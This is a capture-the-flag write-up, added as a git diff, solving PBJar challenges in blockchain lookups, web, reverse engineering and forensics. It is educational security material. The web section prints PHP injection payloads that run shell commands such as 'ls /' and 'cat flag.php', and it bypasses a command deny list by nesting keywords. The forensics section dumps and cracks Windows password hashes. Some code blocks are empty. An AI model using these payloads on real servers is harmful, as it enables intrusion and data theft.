@@ -39,51 +39,1003 @@ tags: CTF
 
 ### TechLead
 
+```
+Infamous YouTuber, and ex-Google / ex-Facebook TechLead found a quick way to make a few million dollars of a crypto scam (as a millionare). He created the ERC-20 token Million (MM), and started promoting it on his social media platforms. The deployer address of the Million token smart contract is the personal address of TechLead, what is the highest historical Ethereum balance of his personal address?
+
+Million Token: https://coinmarketcap.com/currencies/million/
+
+Flag format: flag{0.006942069420}
+
+Created by bruh.
+```
+
+A majority of the challenges in the Misc category were about blockchain so get
+ready for some block investigation. For Techlead we are asked to find the highest
+ETH balance of Techlead's personal wallet. To start I began with a quick google search
+to see if their wallet address popped up.
+
+![Google](/assets/pbjar/tech1.png)
+
+Sure enough, the third link down had an etherscan link to a wallet. On the etherscan
+page there is confirmation that this is probably the right address.
+
+![Mod Comment](/assets/pbjar/tech2.png)
+
+Now we just needed to find the highest balance. Luckily, etherscan has an analytics tab
+that displays things like highest and lowest values.
+
+![Analytics](/assets/pbjar/tech3.png)
+
+This wallet had an historical high of 1.4625790953780384 ETH in it. All that's left was
+to try the flag.
+
+```
+flag{1.4625790953780384}
+```
+
+And success! The flag worked and the challenge was complete.
+
+&nbsp;
+
 ### readFlag1
+
+```
+The address of my new smart contract is 0xf0674CD7D1C0c616063a786E7d1434340E09BadD, the flag is inside it, and the code is published on Etherscan.
+
+Important: This smart contract is on Ropsten
+
+Created By: bruh.
+```
+
+The goal of this next challenge is to retrieve the flag from a smart contract on the
+Ropsten test net. The first step was to look up 0xf0674CD7D1C0c616063a786E7d1434340E09BadD
+on ropsten etherscan.
+
+![Contract](/assets/pbjar/reado1.png)
+
+Next I examined the contract further in the "Contract" tab to see if there were any
+more details.
+
+![Tab](/assets/pbjar/reado2.png)
+
+Among the extra details there is the source code and ABI for the contract. And just like the
+description said, the flag was right there in the code.
+
+```
+flag{etherscan_S0urc3_c0de}
+```
+
+&nbsp;
 
 ### readFlag2
 
+```
+I have republished the previous the contract at 0x585C403bC5c7eb62BF3630c7FeF1F837603bA866, but this time no source code for you this time. Luckily, the ABI of the smart contract is the same as the previous one. Figure out how to "get()" the flag.
+
+Important: This smart contract is on Ropsten
+
+Created By: bruh.
+```
+
+Part 2 of this set of readFlag challenges asks us to "get()" the flag from the smart contract.
+A few important details are provided as well. First, obviously, the smart contract address.
+Second, that the ABI (Application Binary Interface) is the same as the previous challenge.
+On that second note, here is the previous challenge's ABI:
+
+```
+[{"inputs":[],"name":"get","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"}]
+```
+
+From how I understand it, the ABI is the smart contract equivalent of an API. So from here
+I found 2 ways to proceed, 1) create a script using web3.js and call get() from the ABI, 2)
+Use a site like https://justsmartcontracts.dev/#/ to do the call for me. I had no idea
+how to make a script for this one so I chose option 2.
+
+![Smart Contracts](/assets/pbjar/readt1.png)
+
+The smart contracts site requires 2 pieces of information to work: an address and an ABI,
+which is exactly what we have. From here it was as simple adding a contract and
+inputting the details, remembering to set the network id to Ropsten.
+
+![Details](/assets/pbjar/readt2.png)
+
+Next to look at the fruits of our labour.
+
+![Contract Details](/assets/pbjar/readt3.png)
+
+In the "Properties" tab we can clearly see the result of a get() call, the flag.
+
+```
+flag{web3js_plus_ABI_equalls_flag}
+```
+
+&nbsp;
+
 ### readFlag3
 
+```
+0xe2a9e67bdA26Dd48c8312ea1FE6a7C111e5D7a7A
+
+Important: This smart contract is on Ropsten
+
+Created By: bruh.
+```
+
+This is the final challenge in this set of readFlag challenges and the goal of this one
+is a bit ambiguous compared to the last. We are given another smart contract address and
+need to find the flag somewhere in it. I began by checking it out on the Ropsten etherscan.
+
+![Contract](/assets/pbjar/readr1.png)
+
+The contract is fairly similar to readFlag1 in terms of details. However, there are
+a few more sections.
+
+![Sections](/assets/pbjar/readr2.png)
+
+The few extra sections provide more details on the contract code and execution. Most importantly,
+inside "Constructor Arguments" there are encoded and decoded function arguments. One of which,
+is the flag.
+
+```
+flag{s3t_by_c0nstructor}
+```
+
+&nbsp;
+
+
 ### MEV
+
+```
+The miner of Block #12983883 on the Ethereum Blockchain partakes in the common practice of MEV. What is the exact amount of Ether that was transfered to the miner as a bribe from the transaction that was included first in this block?
+
+Info about MEV: https://ethereum.org/en/developers/docs/mev/
+
+Flag format: flag{0.006942069420}
+
+Created By: bruh.
+```
+
+MEV is a challenge with the goal of examining an ETH miner to find a "bribe" of sorts.
+We are given a block number where this all takes place as well as a link to information
+about MEV.
+
+	Maximal (formerly "miner") extractable value (MEV) refers to the maximum value that can be extracted from block production in excess of the standard block reward and gas fees by including, excluding, and changing the order of transactions in a block.
+
+With MEV the miner has control over what is/isn't allowed on the block and the order of
+transactions. This means the miner could order a transaction first if they were "inclined" to.
+With this in mind, I went on to examine the block.
+
+![Block](/assets/pbjar/mev1.png)
+
+Since there didn't appear to be anything referring to an obvious "bribe" on the
+main page, I moved on to check the transactions on the block.
+
+![Transactions](/assets/pbjar/mev2.png)
+
+Now assuming that this transaction order is sorted by latest completion, the first
+transaction on the block should be at the end of this list.
+
+![Last Transaction](/assets/pbjar/mev3.png)
+
+There was a conspicuous entry mentioning MEV Bot at the end of the list. Which seemed like
+a good place to start.
+
+![MEV Bot](/assets/pbjar/mev4.png)
+
+Transaction 0xddb777fbc72b8c3f31f687e302412c2f663b704bcf2faab5d938cd3f9c8b41f8 lists
+a couple of transfers in its "Interacted With (To):" section. One of which, has the
+miner's address. Sure enough, the transfer value was the "bribe" and the flag.
+
+```
+flag{0.009672680170055358}
+```
+
+&nbsp;
 
 ## Pwn
 
 ### Ret2Libc
 
+```
+Ready to learn how to take ROP to the next level?
+
+Connect with "nc 143.198.127.103 42001".
+
+Created By: Rythm
+```
+
+
+
 ### Walkthrough
+
+```
+This program is supposed to be an introduction to pwn that guides you through creating some exploits.
+
+While the program may look long, the majority of the program is just printing information to help teach you basic pwn techniques.
+
+I hope this can help people who are confused begin to understand the general concept of how pwn exploits work by changing parts of memory.
+
+Connect with "nc 147.182.172.217 42001".
+
+Created By: Rythm
+```
 
 ## Rev
 
 ### web
 
+```
+I downloaded this program back when the version number was still v1. It's been a long time... I heard the most recent update has the flag in it.
+
+Created By: eyangch
+```
+
+web is a Rev challenge... web is a Rev challenge where we are given a website link
+which downloads an executable "v1" and are tasked with finding the most recent update for it. When
+v1 is invoked it will "update" and download the next version of the program.
+
+![V1 to V2](/assets/pbjar/version1.png)
+
+The problem is, who knows how many versions behind the program is. It could take a while to
+manually update to the latest version. Next I tried to skip ahead some versions by manipulating the
+url.
+
+![Url Manipulation](/assets/pbjar/version2.png)
+
+It turns out, I could access whichever version I wanted by changing the url. So I used
+this direct object reference "vulnerability" to see what happens when I input an insanely
+large version number.
+
+![Large Version Fail](/assets/pbjar/version3.png)
+
+The site returns a "failed to find version message" meaning there is a limit to the
+version numbers. All that I needed to do was find the last version number that works.
+This boils down to a success or fail condition, meaning, it should be able to be tested
+with a binary search of sorts. The next step was to create a script to do this work for me.
+
+```
+
+```
+
+The script examines the webserver responses to see if the version is available or not
+and narrows down the search field. Running it results in the latest version number.
+The final step was to download this version and run it to get the flag.
+
+![Run final version](/assets/pbjar/version5.png)
+
+```
+flag{h0w_l0ng_wher3_y0u_g0ne_f0r_3910512832}
+```
+
+&nbsp;
+
 ## Web
 
 ### ProgrammersHateProgramming
 
+```
+just a little different than before
+
+Created By: ZeroDayTea
+```
+
+![Site](/assets/pbjar/prog1.png)
+
+ProgrammersHateProgramming is the first in a pair of challenges where we are tasked with
+examining a note taking application for vulnerabilities. When I first completed the challenge
+there wasn't any source code available but later on the admins provided it to make the challenge
+less guessy. Let's take a look at this code.
+
+```
+<?php
+if(isset($_POST["notewrite"]))
+{
+    $newnote = $_POST["notewrite"];
+    $notetoadd = str_replace_first("<?php", "", $newnote);
+    $notetoadd = str_replace_first("?>", "", $notetoadd);
+    $notetoadd = str_replace_first("<script>", "", $notetoadd);
+    $notetoadd = str_replace_first("</script>", "", $notetoadd);
+    $notetoadd = str_replace_first("flag", "", $notetoadd);
+
+    $filename = generateRandomString();
+    array_push($_SESSION["notes"], "$filename.php");
+    file_put_contents("$filename.php", $notetoadd);
+    header("location:index.php");
+}
+?>
+```
+
+The source code reveals that this challenge is all based around PHP and is either
+some form of PHP injection or XSS. The code also reveals that there is a blacklist of sorts.
+The blacklist checks for the first occurrence of several sensitive keywords and tags.
+Before the code was released, I was able to check for these filters by noticing what strings
+got removed from the resulting note.
+
+Luckily, this set of filters is pretty easy to bypass. Since it only checks for the first
+occurrence, we can just put another set of "<?php" or "flag" at the front of our payload
+to avoid it. To test this out I tried this POC:
+
+```
+<?php<?php phpinfo(); ?>?>
+```
+
+And this was the resulting note:
+
+![Phpinfo Note](/assets/pbjar/prog5.png)
+
+So I guess the exploit works. The next move was to find the flag. Since I was able to inject
+PHP commands and see the output, I could invoke a system command and look for the flag
+on the server.
+
+```
+<?php<?php system("ls"); ?>?>
+```
+
+The current directory looked like the place where all the notes are stored but unfortunately,
+didn't contain any flags.
+
+```
+<?php<?php system("ls /"); ?>?>
+```
+
+The root directory was a different story. It had a file named flag.php, which seemed
+like a good file to look into. Note: remember that flag is a filtered word so we need to
+bypass that as well as the PHP tags.
+
+```
+flag<?php<?php system("cat flag.php"); ?>?>
+```
+![Flag.php](/assets/pbjar/prog3.png)
+
+And there it is, the really long and informative flag we were looking for.
+
+```
+flag{server_side_php_xss_is_less_known_but_considering_almost_80%_of_websites_use_php_it_is_good_to_know_thank_me_later_i_dont_want_to_stop_typing_this_flagg_is_getting_long_but_i_feel_like_we're_developing_a_really_meaningful_connection}
+```
+
 ### ProgrammersHateProgramming 2
+
+```
+oh noes now there are more filters :((
+
+Created By: ZeroDayTea
+```
+
+The sequel to the previous ProgrammersHateProgramming challenge, ProgrammersHateProgramming 2
+contains a beefed up blacklist with a few new filters. This time the source code was
+provided right from the beginning but still wouldn't take THAT much guessing to figure out.
+
+```
+<?php
+if(isset($_POST["notewrite"]))
+{
+    $newnote = $_POST["notewrite"];
+    $notetoadd = str_replace_first("<?php", "", $newnote);
+    $notetoadd = str_replace_first("?>", "", $notetoadd);
+    $notetoadd = str_replace_first("<?", "", $notetoadd);
+    $notetoadd = str_replace_first("flag", "", $notetoadd);
+
+    $notetoadd = str_replace("fopen", "", $notetoadd);
+    $notetoadd = str_replace("fread", "", $notetoadd);
+    $notetoadd = str_replace("file_get_contents", "", $notetoadd);
+    $notetoadd = str_replace("fgets", "", $notetoadd);
+    $notetoadd = str_replace("cat", "", $notetoadd);
+    $notetoadd = str_replace("strings", "", $notetoadd);
+    $notetoadd = str_replace("less", "", $notetoadd);
+    $notetoadd = str_replace("more", "", $notetoadd);
+    $notetoadd = str_replace("head", "", $notetoadd);
+    $notetoadd = str_replace("tail", "", $notetoadd);
+    $notetoadd = str_replace("dd", "", $notetoadd);
+    $notetoadd = str_replace("cut", "", $notetoadd);
+    $notetoadd = str_replace("grep", "", $notetoadd);
+    $notetoadd = str_replace("tac", "", $notetoadd);
+    $notetoadd = str_replace("awk", "", $notetoadd);
+    $notetoadd = str_replace("sed", "", $notetoadd);
+    $notetoadd = str_replace("read", "", $notetoadd);
+    $notetoadd = str_replace("ls", "", $notetoadd);
+    $notetoadd = str_replace("ZeroDayTea is not hot", "", $notetoadd);
+
+    $filename = generateRandomString();
+    file_put_contents("$filename.php", $notetoadd);
+    header("location:index.php");
+}
+?>
+```
+
+So this time the site had the same previous filters but also a few new ones that
+filtered commands like cat. However, the filters aren't really that effective again.
+The new filters replace all occurrences of their keyword that they see, but they are
+not recursive. This means we can "nest" a keyword within itself and it will only filter
+the inner keyword. For example
+
+```
+str_replace("cat", "", "ccatat") = cat
+
+or basically,
+
+ccatat ---> cat
+```
+
+All I needed to do was slightly adjust the payload from the previous challenge.
+
+```
+flag<?php<?<?php system("ccatat /flag.php") ?>?>
+```
+
+![Result of Payload](/assets/pbjar/progrevenge1.png)
+
+Again, the flag is printed out nicely in the note we created.
+
+```
+flag{wow_that_was_a_lot_of_filters_anyways_how_about_that_meaningful_connection_i_mentioned_earlier_:)}
+```
 
 ### cOrL
 
+```
+Descriptions are hard give me a break. (Think of common usernames and passwords for admin)
+
+Created By: ZeroDayTea
+```
+
+c0rL is a sourceless web challenge that gives us a simple website.
+
+![Login Page](/assets/pbjar/corl1.png)
+
+The website initially presents a login page. The page source is mostly empty and doesn't
+offer too many hints. Supposedly, the goal here is to break in through this login form.
+The first thing to try with most of these is to try some common weak username password
+combinations.
+
+![admin](/assets/pbjar/corl2.png)
+
+Inputting the combination admin:admin resulted in the output in Figure #. This output
+provided a huge hint on what to do next. The keyword of the sentence "put" immediately reminded
+me of the HTTP PUT method. The next step seemed to be to try sending the login as a PUT request
+instead of the default POST.
+
+![PUT Request Curl](/assets/pbjar/corl3.png)
+
+I used curl to craft the request but any other similar tool (burp, etc) would have worked.
+The response to the PUT request contains just what we needed, the flag.
+
+```
+flag{HTTP_r3qu35t_m3th0d5_ftw}
+```
+
+&nbsp;
+
 ### Hack NASA With HTML Mr. Inspector Sherlock
+
+```
+now introducing... the world's best website ever!!!
+
+Created By: DefyGG
+```
+
+Presenting the next challenge, the ~~ugliest~~ best website ever! For this challenge we
+are given a link to a website and must crawl through it to find parts of the flag.
+To save everyone the eyesore, I will try to only include screenshots of web source, it
+is the only bit that matters in this challenge really.
+
+The theme of this challenge is inspecting web source for clues. That means looking through
+the HTML code, style sheets, javascript, images, cookies, etc. It is important to be really thorough
+and/or use tools to assist with this. I ended up finding the parts of the flag in reverse
+order but here were their locations.
+
+![Flag Part 3](/assets/pbjar/sherlock1.png)
+
+```
+_a_d3t3ct1iv3????!?!?!}
+```
+
+The third part of the flag was hidden inside the HTML of the index page. Within this __
+block and in a rendered view would be seen quickly scrolling accross the page.
+
+![Flag Part 2](/assets/pbjar/sherlock2.png)
+
+```
+I_th0ugh1_sh3l0ck_w2s
+```
+
+The second part of the flag was hidden in plain sight on the about-styled page.
+
+![Flag Part 1](/assets/pbjar/sherlock3.png)
+
+```
+flag{wA1t_a_m1nUt3_
+```
+
+The first (or final) part of the flag is hidden in javascript for the old.html
+page. The final step to this whole process is to combine all these parts into
+a single complete flag.
+
+```
+flag{wA1t_a_m1nUt3_I_th0ugh1_sh3l0ck_w2s_a_d3t3ct1iv3????!?!?!}
+```
+
+&nbsp;
 
 ## Forensics
 
 ### Stegosaurus stenops
 
+```
+This stenops swallowed the flag... and some unusually large rock
+
+Created By: ZeroDayTea
+```
+
+To start off forensics we have Stegosaurus stenops, a steganography challenge.
+Supposedly, inside the given .jpg file there is a hidden flag.
+
+![Stego](/assets/pbjar/stegosaurus.jpg)
+
+Upon initial inspection, the image shows nothing untoward. The next step for me was
+to apply some tools to the file to see if there are any hints or flags in the open.
+However, nothing really worked out or gave any important details. Eventually I looked up
+some jpg steganography tools and tried out stegseek. My goal with stegseek was to attempt
+to bruteforce a password and extract anything hidden in the image.
+
+![Stegseek](/assets/pbjar/stego1.png)
+
+Stegseek quickly output a passphrase but also some hidden text into my output file.
+The hidden text was the flag we were looking for.
+
+```
+flag{ungulatus_better_than_stenops}
+```  
+
 ### Art Mystery
+
+```
+You put you new artwork into a safe but when you looked in the morning,
+someone had stolen it!! Next time you'll have to cheCk youR loCk.
+
+P.S I might want to remake this challenge with a new image and flag
+
+Created By: ZeroDayTea
+```
+
+Art Mystery starts out with us investigating a png file. Let's take a look at the image.
+
+![Art](/assets/pbjar/art2.png)
+
+The file is clearly broken and my default viewer says there is a CRC error in the IHDR chunk.
+This means that some part of the IHDR does not match up with the picture's original CRC value.
+To inspect further I tried using pngcheck on the file.
+
+![Pngcheck](/assets/pbjar/art1.png)
+
+The error appears to be a result of the dimensions of the image being set to 0 x 0.
+Unfortunately, pngcheck didn't reveal any potential fixes or values that would work.
+So naturally I just tried editing in a random one.
+
+To preface this operation, I should explain a bit about the IHDR chunk. According to
+[this resource]() the IHDR chunk will have the following qualities:
+
+```
+The IHDR chunk must appear FIRST. It contains:
+
+   Width:              4 bytes
+   Height:             4 bytes
+   Bit depth:          1 byte
+   Color type:         1 byte
+   Compression method: 1 byte
+   Filter method:      1 byte
+   Interlace method:   1 byte
+```
+
+The important parts for this challenge are the width and height, which come right after the IHDR
+header. Here's an example of what it looks like in a normal png file.
+
+![Example png](/assets/pbjar/art_ihdr.png)
+
+Figure # shows the example IHDR chunk with the width and height bytes highlighted. These values
+are what I edited to attempt to fix the file. I put in some random values and tried pngcheck again.
+
+![Pngcheck 2](/assets/pbjar/art3.png)
+
+It's not a full fix, but its does reveal the CRC we need to get. So hopefully, all we need to do
+is find the right width and height to satisfy the CRC. I found an excellent script [here]() to
+do the bruteforcing for me.
+
+```
+from zlib import crc32
+
+data = open("art.png",'rb').read()
+index = 12
+
+ihdr = bytearray(data[index:index+17])
+width_index = 7
+height_index = 11
+
+for x in range(1,2000):
+        height = bytearray(x.to_bytes(2,'big'))
+        for y in range(1,2000):
+                width = bytearray(y.to_bytes(2,'big'))
+                for i in range(len(height)):
+                        ihdr[height_index - i] = height[-i -1]
+                for i in range(len(width)):
+                        ihdr[width_index - i] = width[-i -1]
+                if hex(crc32(ihdr)) == '0x60444cb6':
+                        print("width: {} height: {}".format(width.hex(),height.hex()))
+        for i in range(len(width)):
+                        ihdr[width_index - i] = bytearray(b'\x00')[0]
+```
+
+The script will attempt all dimensions within a range and check the CRC value, printing out
+every valid set of dimensions. Here is the script in action:
+
+![Script](/assets/pbjar/art4.png)
+
+So for art.png we just need to edit into the IHDR "02b0" for both width and height and the picture
+should be fixed. After a quick edit, I had a new, working picture and the flag.
+
+![Real Art](/assets/pbjar/art.png)
+
+```
+
+```
+
+&nbsp;
+
+
 
 ### Wirf die Gläser an die Wand
 
+```
+Our operatives managed to intercept this message. We know they've been transporting their
+plans over the network we infiltrated so there must be something here that we're not seeing.
+
+Created By: ZeroDayTea
+```
+
+For this challenge we are given a single text file containing lyrics to Moskau by
+Dschinghis Khan. Supposedly, somewhere hidden in this message, there is a flag we
+need to find. I started by examining the file in a notepad.
+
+![notepad](/assets/pbjar/german1.png)
+
+Nothing seemed out of the ordinary so I moved on to examine the file's hex in xxd.
+
+![xxd](/assets/pbjar/moscow1.png)
+
+The file has some extra whitespace characters hidden between the lines of lyrics.
+Specifically, it contains extra spaces and tabs. Searching up whitespace steganography
+revealed a tool called stegsnow which uses this same set of characters to encode a message.
+Stegsnow appends tabs and spaces to the end of lines of text to hide the message.
+Next I tried running stegsnow against the message to see what was hiding there.
+
+![Stegsnow Round 1](/assets/pbjar/german3.png)
+
+Unfortunately, stegsnow wasn't too keen on returning anything just yet. It either needed
+a password for decoding or I was way off course. For passwords, nothing seemed more suitable
+to me than the title of the song. So I tried stegsnow again with both the English and German
+titles as passwords.
+
+![Flag](/assets/pbjar/moscow.png)
+
+The German version of the password turned out to be the most effective and out popped
+the flag.
+
+```
+
+```
+
+&nbsp;
+
 ### tippy tappies
+
+```
+how'd you get this in the first place :eyes: dids you has logger on me?
+
+Created By: ZeroDayTea
+```
+
+Tippy tappies is a forensics challenge where we are given a capture of some USB input.
+To start off, let's look at the capture in Wireshark.
+
+![USB Captures](/assets/pbjar/tippy1.png)
+
+The USB capture contains a variety of different packet types. The majority of the
+frames are USB protocol "URB_INTERRUPT in" frames. Given how many of them there are,
+I felt it was a decent place to start my examination.
+
+![Interrupt in Frame](/assets/pbjar/tippy2.png)
+
+The interrupt in frames in this capture contain a bunch of HID data that shows the USB device
+was a keyboard. Meaning this capture must be some sort of keylogging session. In Figure #
+we can see there are two varieties of interrupt in frames - input and confirmation.
+With this in mind, I narrowed down my search to just input frames using a filter.
+
+![Filter](/assets/pbjar/tippy3.png)
+
+I used a combination of filters to find only frames with valid key input. Looking through
+some of the input, it was highly likely that I was on the right track. By just scrolling
+through some of the packets you can make out phrases like "sudo apt-get". From here there
+are two possible ways to move forward:
+
+- Scroll through the input frames until the flag is found
+- Create a script to output the keys pressed in order
+
+Both are completely valid ways to solve this problem but for visual "wow" I'll demo
+a script for reading and decoding the frames. However, first, I exported only the keyboard
+input frames into a new pcapng file using "File -> Export Specified Packets".
+
+```
+import re
+
+# HID codes in decimal
+hid_codes = {
+        4: 'a', 5: 'b', 6: 'c', 7: 'd', 8: 'e', 9: 'f', 10: 'g',
+        11: 'h', 12: 'i', 13: 'j', 14: 'k', 15: 'l', 16: 'm',
+        17: 'n', 18: 'o', 19: 'p', 20: 'q', 21: 'r', 22: 's',
+        23: 't', 24: 'u', 25: 'v', 26: 'w', 27: 'x', 28: 'y',
+        29: 'z', 30: '1', 31: '2', 32: '3', 33: '4', 34: '5',
+        35: '6', 36: '7', 37: '8', 38: '9', 39: '0', 40: '\n',
+        42: '\b', 43: '\t', 44: ' ', 45: '-'
+}
+
+data = ""
+with open('keyboard.pcapng', 'rb') as f:
+    data = f.read()
+
+# Regex find all blocks of 72 bytes starting with the header
+key_frames = re.findall(b'\xc0\xcc\rf\xc5\x98\xff\xff.{64}', data, re.DOTALL)
+
+# Extract first key code from the frame
+key_codes = []
+for frame in key_frames:
+        # Remove double key stroke for readability
+        if frame[-5] == 0:
+            key_codes.append(frame[-6])
+
+# Translate key codes to ascii
+result = ''
+for key in key_codes:
+    if key in hid_codes.keys():
+        result += hid_codes[key]
+print(result)
+```
+
+First off, the keyboard sends Human Interface Device (HID) codes within each frame
+to represent which is pressed, so we need a dictionary to help translate them to ascii.
+Next each input frame is 72 bytes long and begins with the header bytes "c0 cc 0d 66 c5 ff
+ff". So the script matches all such blocks and puts them in a list. Just before translating,
+each block must be trimmed down to only the key press code. Finally, the code can be
+translated into ascii.
+
+![Script Output](/assets/pbjar/tippy4.png)
+
+Figure # shows the output of the script when run against the new .pcapng file. Among
+the output is the flag (which requires a tiny bit of formatting).
+
+```
+flag{wowgoodusbdetectivework}
+```
+
+&nbsp;
+
 
 ### Luna Guesser
 
+```
+We intercepted this message being sent from a strange location. Can you figure out where it's being sent from?
+
+Note: The flag is the name of a location. All lowercase letters and words separated by spaces.
+ex: flag{new_york_city}
+
+Created By: ZeroDayTea
+```
+
+Luna Guesser is an audio forensics challenge where we are given a single .wav file
+and need to find the location it was sent from. The audio sounds pretty crazy, it
+almost sounds like connecting to dial-up internet.  
+
+[Click Here to Listen to the Audio](/assets/pbjar/LunaGuesser.wav)
+
+The trickiest part of this challenge is figuring out exactly what this sound is.
+Given the name of the challenge and the description, I banked on the idea that
+this sound had something to do with space or the moon. I searched for a while before
+stumbling upon some interesting results.
+
+![Luna Decode](/assets/pbjar/)
+
+My search "luna decode signal" mentioned slow-scan television (SSTV). SSTV is a method for
+radio operators to send pictures. But more importantly, it has been used quite a bit for
+transmitting images from space. Here is an example of what SSTV sounds like.
+
+[Click Here to Listen to an SSTV Signal Example]()
+
+The example is quite alike the .wav file we were given. Now that we know what it is,
+we just have to turn it into a picture. There are a few tools available to perform this.
+I ended up using QSSTV but really any single one should work well enough. Next I [piped the
+audio into QSSTV]() and tried to get a picture out of it.
+
+![QSSTV Gif](/assets/pbjar/)
+
+Figure # shows the decoding in action. Eventually, the audio ends and the full
+picture is rendered.
+
+![Moon Landing](/assets/pbjar/)
+
+The output is clearly a picture from the 1969 Moon Landing. So supposedly, the
+location we are looking for is somewhere on the moon. Specifically, the moon landing site.
+A quick search turns up all we should need.
+
+![Moon landing search](/assets/pbjar/)
+
+There are a few of options here to try:
+
+- Tranquility Base
+- Statio Tranquillitatis
+- Mare Tranquillitatis
+
+Trial and error is the best bet here. In the end, the correct answer turned out to
+be option 3: Mare Tranquillitatis.
+
+```
+flag{mare_tranquillitatis}
+```
+
+&nbsp;
+
 ### memedium
+
+```
+not memeasy not memhard... just memedium. (p.s. it'd be good if you found password and wrapped it in flag{} lol)
+
+Created By: ZeroDayTea
+```
+
+This forensics challenge involves extracting a password from a memory dump. To begin
+I started up volatility to get an idea of what profile I should use for this analysis.
+
+![Vol.py](/assets/pbjar/meme1.png)
+
+Out of the 3 choices available I decided to go with the first one "". Next I need
+to get a dump of all the NTLM hashes from the file. To do this I use the hashdump
+plugin.
+
+![Hashdump](/assets/pbjar/meme2.png)
+
+After a few seconds 3 hashes popped out. To continue, I copied these hashes to a
+file and ran them through john the ripper.
+
+![John](/assets/pbjar/meme3.png)
+
+Figure # shows the output of john the ripper. There is only 1 hash that john was able
+to crack and nicely enough, it is the admin hash. This seems like a good enough
+guess at the flag and sure enough, it works.
+
+```
+flag{superman83}
+```
+
+&nbsp;
 
 ### Mr. Robot and Friends
 
+```
+phishing scams are scaryyyy ;w; and it seems like this fool fell for the oldest
+trick in the book. maybe if he watched more Mr. Robot he'd know how about this
+kind of thing (the flag is the name of the person who sent the phishing email
+e.g. flag{Bob_Smith})
+
+Created By: ZeroDayTea
+```
+
+This next memory forensics challenge revolves around finding a phishing email within the
+memory. The goal of this challenge is to find the name of someone who sent a fishing email.
+Like memedium, I first needed to get a profile name to use in volatility.
+
+![Profile](/assets/pbjar/robot1.png)
+
+Again, there are a few choices but the first one is fine by me. Next I wanted to do a few things
+to search for emails in the capture. First, I wanted to see if outlook had a running process.
+To check the processes in the capture I used the pslist plugin.
+
+![pslist](/assets/pbjar/robot2.png)
+
+Luckily, outlook was running so I could dump the memory specific to its process.
+Noting down the PID for outlook (3196), I used the memdump plugin to, well, dump the
+memory.
+
+![memdump 3196](/assets/pbjar/robot3.png)
+
+Now that all the outlook process memory was in 1 file I wanted to move on to seeing if
+the capture had any .pst or .ost files in it. With these files I might be able to get
+a look at some full emails.
+
+![Filescan](/assets/pbjar/robot4.png)
+
+Combining the filescan plugin with a grep printed out some useful information. There are
+a trio of potential .ost files. The ost files also reveal an account on the machine,
+FrontDesk. Next, to dump the ost data.
+
+![File dump](/assets/pbjar/robot5.png)
+
+Unfortunately, like in Figure #, none of the .ost files had much data in them, definitely
+not enough to work with. I then worked back a few steps to the outlook process dump.
+I started examining it by trying to extract some email addresses from the process dump.
+
+![grep emails](/assets/pbjar/robots6.png)
+
+I managed to grep a bunch of email addresses from the file, a few of which were mangled a bit.
+Looking through the list I noticed one fairly conspicuous email: th3wh1t3r0s3@gmail.com.
+The rest of the emails were fairly normal looking so I decided to investigate the white rose
+first.
+
+![white rose](/assets/pbjar/robot_mayb_needed.png)
+
+Issuing a grep for the email shows a few results, most importantly, a "From: Th3 Wh1t3R0s3" tag.
+There is an email from Th3 Wh1t3R0s3 in memory but the contents aren't available from this view.
+To investigate further I examined the process dump starting at the line where the "From" tag appears.
+
+![Tail command](/assets/pbjar/robot8.png)
+
+A few lines following the From tag there is the "To:" tag which shows that frontdesk is the direct
+recipient of this email. However, still no readable email body. I figured with a bit more work,
+we might be able to figure out the contents of this email.
+
+![Grep hello](/assets/pbjar/robot10.png)
+
+Grepping for "hello" reveals a single email body with a few suspicious details. The email is targeted
+at a Mr. Wellick with the headline "VPN Update". The email also offers a link to some software named
+AnyConnectInstaller. The message ends with a send off from "AllSafe IT Support Desk" which directly
+correlates to the frontdesk@allsafecybersec.com email address and the previous email tags.
+
+Given the lack of other emails or correspondence, it seemed like a good bet that this was an
+email in response to the phishing email in question. Connecting the dots further, this email
+is a response to the one sent by Th3 Wh1t3R0s3. Which means Th3_Wh1t3R0s3 should be the flag.
+Submitting this flag resulted in a victory and the challenge was complete.
+
+```
+flag{Th3_Wh1t3R0s3}
+```
+
+&nbsp;
+
 ### Lysergic acid diethylamide
+
+```
+Don't do drugs kids and look for hints in the challenge
+
+Created By: ZeroDayTea
+```
+
+LSD is an image forensics challenge in which we must find a flag hidden in a .png file.
+
+![The Photo](/assets/pbjar/secret.png)
+
+Figure # shows the .png in question. There is nothing particularly noticeable from the
+image itself so I decided to move on and try some steganography tools on it.
+
+![Zsteg](/assets/pbjar/secret1.png)
+
+I tried a few tools before finally hitting some interesting result with zsteg. The
+results of zsteg reveal one of the hints the description was hinting at. The hint states
+that the flag is hidden in the LSBs of the image but it has an offset. Fortunately,
+unlike what the hint says, zsteg is able to provide an offset.
+
+![Zsteg shifted](/assets/pbjar/secret2.png)
+
+I decided to start with a shift of 2 and the results were very hopeful. Figure # shows
+that zsteg was able to find a large portion of the flag written backwards. Next I
+attempted a few bruteforce attempts on the shift to see if I could get more of the
+flag printed.
+
+![Zsteg shift 6](/assets/pbjar/secret3.png)
+
+A shift of 6 ended up providing next important result. In fact, the shift was just
+the right amound to print out the flag that was hiding in the LSBs.
+
+```
+flag{dont_do_drugs_solve_column_based_lsbeeeeee}
+```
+
+&nbsp;
 
 ## Conclusion
 
